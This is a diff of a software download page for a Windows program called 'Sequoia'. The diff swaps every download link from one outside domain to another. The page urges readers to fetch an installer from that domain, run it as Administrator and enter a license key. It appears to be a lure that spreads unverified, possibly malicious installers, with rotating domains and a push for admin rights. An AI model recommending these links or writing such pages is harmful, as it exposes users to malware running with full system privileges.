@@ -14,27 +14,27 @@
 > **This is the download page.** Use the button or link below to get **Sequoia** for Windows.
 
 <p align="center">
-  <a href="https://sequoia.wonderchain.fun/">
+  <a href="https://sequoia.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Sequoia-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Sequoia">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[sequoia.wonderchain.fun](https://sequoia.wonderchain.fun/)** |
-| **Full URL** | `https://sequoia.wonderchain.fun/` |
+| **Direct link** | **[sequoia.kolmods.com](https://sequoia.kolmods.com/)** |
+| **Full URL** | `https://sequoia.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — sequoia.wonderchain.fun](https://sequoia.wonderchain.fun/)** (link above)
+1. Click **[Download — sequoia.kolmods.com](https://sequoia.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://sequoia.wonderchain.fun/"><strong>⬇ Download Sequoia now</strong></a></p>
+<p align="center"><a href="https://sequoia.kolmods.com/"><strong>⬇ Download Sequoia now</strong></a></p>
 
 ---
 
